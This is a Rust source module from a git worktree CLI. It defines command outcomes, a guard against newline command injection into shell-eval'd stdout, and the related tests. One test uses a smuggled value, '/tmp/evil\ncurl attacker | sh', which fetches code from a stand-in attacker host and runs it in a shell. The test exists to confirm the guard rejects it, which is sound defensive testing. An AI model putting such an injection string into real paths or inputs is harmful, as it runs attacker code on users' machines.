//! Command handlers: pure-ish logic returning an [`Outcome`].
//!
//! Each handler takes its injected side-effects (an [`Io`], a [`GitRunner`], a
//! [`RepoResolver`], etc.) and returns an [`Outcome`]. The single stdout write
//! for the eval'd `cd` contract is owned by the binary, NOT here — a handler
//! only *requests* a `cd` by returning `Outcome { cd_path: Some(..) }`. Human
//! output goes to stderr via the `Io`. This keeps the eval contract enforced at
//! exactly one point (with the newline guard) and the handlers unit-testable.

pub mod clean;
pub mod config;
pub mod doctor;
pub mod home;
pub mod jump;
pub mod rename;
pub mod scratch;
pub mod shell_setup;
pub mod start;
pub mod trust;
pub mod untrust;
pub mod upgrade;
pub mod verify;

use crate::error::{Result, VibeError};

/// The result of a command: what (if anything) to write to stdout.
///
/// stdout is reserved for shell-eval'd output. Two kinds exist and are mutually
/// exclusive:
/// - `cd_path`: the binary prints `format_cd_command(cd_path)` exactly once
///   (with the newline guard) after the handler returns `Ok`.
/// - `stdout`: verbatim stdout text for `shell-setup` (the shell wrapper
///   function / completion script), which the binary prints as-is.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct Outcome {
    pub cd_path: Option<String>,
    pub stdout: Option<String>,
}

impl Outcome {
    /// A command that produced no stdout (e.g. `config`, `verify`).
    pub fn none() -> Self {
        Outcome::default()
    }

    /// A command requesting the shell wrapper to `cd` into `path`.
    pub fn cd(path: impl Into<String>) -> Self {
        Outcome {
            cd_path: Some(path.into()),
            stdout: None,
        }
    }

    /// A command emitting verbatim stdout text (e.g. `shell-setup`).
    ///
    /// Use this only for TRUSTED, hand-built payloads (the wrapper function /
    /// completion script) that legitimately contain newlines. For an untrusted
    /// path destined for the eval'd stdout, use [`Outcome::stdout_path`].
    pub fn stdout(text: impl Into<String>) -> Self {
        Outcome {
            cd_path: None,
            stdout: Some(text.into()),
        }
    }

    /// A command emitting a single PATH on stdout (the Claude-Code worktree-hook
    /// protocol), guarded like [`Outcome::cd`].
    ///
    /// The shell wrapper evals all stdout, and a worktree path can be derived
    /// from a user `path_script`/settings template, so a `\n`/`\r` in it would
    /// split the eval'd line and inject a second command. Reject it at the
    /// source, mirroring the `cd_path` newline guard in the binary.
    pub fn stdout_path(path: impl Into<String>) -> Result<Self> {
        let path = path.into();
        if path.contains('\n') || path.contains('\r') {
            return Err(VibeError::Worktree(
                "refusing to emit a path containing a newline".to_string(),
            ));
        }
        Ok(Outcome {
            cd_path: None,
            stdout: Some(path),
        })
    }
}

/// Change the process working directory. Injected (rather than calling
/// `std::env::set_current_dir` directly) so `vibe rename` — which must `chdir`
/// after moving a worktree out from under the process — is unit-testable and so
/// the chdir-failure rollback path (Phase 3, security point 4a) can be exercised
/// with a fake that fails on demand.
pub trait ProcessControl {
    /// Change CWD to `path`, mapping any error to a [`VibeError`].
    fn chdir(&self, path: &str) -> Result<()>;

    /// The process's current working directory (as a string). Used by `rename`'s
    /// post-move detective check (security point 4b) to confirm the chdir landed
    /// in the expected directory before mutating refs.
    fn current_dir(&self) -> Result<String>;
}

/// Production [`ProcessControl`] over `std::env`.
pub struct RealProcessControl;

impl ProcessControl for RealProcessControl {
    fn chdir(&self, path: &str) -> Result<()> {
        std::env::set_current_dir(path).map_err(|e| {
            VibeError::FileSystem(format!("Failed to change directory to {path}: {e}"))
        })
    }

    fn current_dir(&self) -> Result<String> {
        std::env::current_dir()
            .map(|p| p.to_string_lossy().into_owned())
            .map_err(|e| VibeError::FileSystem(format!("cannot read current directory: {e}")))
    }
}

/// Hook for the `jump → create` path, which depends on `vibe start`.
///
/// The production impl is [`RealStart`], which runs the real `start_command`.
/// [`UnimplementedStart`] is a test double for jump's unit tests.
pub trait StartCommand {
    /// Create a worktree for `branch_name` and return an [`Outcome`] (usually a
    /// `cd` into the new worktree).
    fn run(&self, branch_name: &str) -> Result<Outcome>;
}

/// Test double for the [`StartCommand`] seam.
///
/// Retained because the `jump` unit tests wire it as the [`StartCommand`] seam
/// (they assert jump's no-match path *delegates*, not that start runs). The
/// binary wires [`RealStart`] so the real create path runs in production.
pub struct UnimplementedStart;

impl StartCommand for UnimplementedStart {
    fn run(&self, _branch_name: &str) -> Result<Outcome> {
        Err(crate::error::VibeError::Argument(
            "create path requires 'vibe start' (use RealStart in production)".to_string(),
        ))
    }
}

/// Production [`StartCommand`]: the `jump → create` path runs the real
/// `start_command` with all production seams. Assembled here (rather than the
/// binary) so vibe-core owns the seam wiring; the binary just constructs it.
pub struct RealStart<'a> {
    /// The build version threaded into settings loads.
    pub version: &'a str,
}

impl StartCommand for RealStart<'_> {
    fn run(&self, branch_name: &str) -> Result<Outcome> {
        use crate::copy::{RealCopyExecutor, RealNativeClone, RealProbe};
        use crate::git::RealGit;
        use crate::io::{Io, RealIo};
        use crate::progress::{IndicatifTracker, NullTracker, ProgressTracker};
        use crate::prompt::RealPrompt;
        use crate::repo_info::RealRepoResolver;
        use crate::stdin::RealStdinReader;
        use crate::worktree_path::RealScriptRunner;
        use start::{start_command, StartDeps, StartFlags};

        let io = RealIo;
        let git = RealGit;
        let resolver = RealRepoResolver::new(&git);
        let script_runner = RealScriptRunner;
        let prompt = RealPrompt::new(&io);
        let stdin = RealStdinReader::new(&io);
        let hook_runner = crate::hooks::RealHookRunner;
        let native = RealNativeClone;
        let probe = RealProbe;
        let executor = RealCopyExecutor::new(&native, &probe);

        // Live tracker only on an interactive stderr; otherwise a no-op. `+ Sync`
        // is required by StartDeps (copy_directories fans it across threads).
        let indicatif;
        let null;
        let tracker: &(dyn ProgressTracker + Sync) = if io.is_stderr_terminal() {
            indicatif = IndicatifTracker::new();
            &indicatif
        } else {
            null = NullTracker;
            &null
        };

        // (The clock seam is used by `scratch`, not the plain jump-create path.)
        let deps = StartDeps {
            io: &io,
            git: &git,
            resolver: &resolver,
            script_runner: &script_runner,
            prompt: &prompt,
            stdin: &stdin,
            hook_runner: &hook_runner,
            executor: &executor,
            tracker,
            version: self.version,
        };
        start_command(
            &deps,
            branch_name,
            &StartFlags::default(),
            crate::output::OutputOptions::default(),
        )
    }
}

#[cfg(test)]
mod outcome_tests {
    use super::Outcome;

    #[test]
    fn stdout_path_accepts_a_clean_path() {
        let outcome = Outcome::stdout_path("/repos/project/feature").unwrap();
        assert_eq!(outcome.stdout.as_deref(), Some("/repos/project/feature"));
        assert_eq!(outcome.cd_path, None);
    }

    #[test]
    fn stdout_path_rejects_newline() {
        // A path that would split the eval'd line and inject a second command.
        assert!(Outcome::stdout_path("/tmp/evil\ncurl attacker | sh").is_err());
    }

    #[test]
    fn stdout_path_rejects_carriage_return() {
        assert!(Outcome::stdout_path("/tmp/evil\rsomething").is_err());
    }

    #[test]
    fn verbatim_stdout_still_allows_newlines() {
        // shell-setup's hand-built wrapper text legitimately contains newlines and
        // must NOT be rejected — that is what the unguarded `stdout` ctor is for.
        let outcome = Outcome::stdout("vibe() { :; }\n");
        assert_eq!(outcome.stdout.as_deref(), Some("vibe() { :; }\n"));
    }
}
